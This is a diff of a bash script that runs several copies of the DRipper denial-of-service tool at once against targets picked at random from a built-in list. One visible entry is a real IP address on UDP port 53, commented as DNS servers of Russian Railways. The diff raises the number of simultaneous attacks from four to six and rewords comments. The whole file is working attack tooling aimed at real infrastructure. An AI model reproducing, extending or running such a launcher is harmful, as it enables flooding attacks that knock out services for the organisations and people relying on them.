@@ -7,9 +7,9 @@
 #!/bin/bash
 #How many copies of DRipper would be launched
 #Low number is counter-productive because some sites might be already down, so script won't do any work
-#Somewhere beetween 4 and 8 targets are good starting point.
-#With high number of targets output will be messy because all instances of DRipper use same terminal
-num_of_targets_to_attack=4
+#Somewhere beetween 4 and 8 targets is good starting point.
+#With high number of copies console output will be messy because all instances of DRipper use same terminal
+num_of_targets_to_attack=6
 
 declare -a targets
 ###################### LIST OF TARGETS #########################
@@ -28,13 +28,13 @@ targets[11]="217.175.140.71 53 udp"      #DNS'ки РЖД.ру
 ################################################################
 list_size=${#targets[*]}
 
-# Get N(num_of_targets_to_attack) random numbers to choose random targets from array "targets"
+# Get multiple(num_of_targets_to_attack) random numbers to choose random targets from "targets" array
 random_numbers=$(shuf -i 1-$list_size -n $num_of_targets_to_attack)
 
 # Launch several copies of DRipper.
 for i in $(seq 1 $num_of_targets_to_attack)
 do
-             # Get address, port and protocol from choosen target
+             # Get address, port and protocol from pre-selected target
              addr=$(echo ${targets[i]} | awk '{print $1}')
              port=$(echo ${targets[i]} | awk '{print $2}')
              prot=$(echo ${targets[i]} | awk '{print $3}')
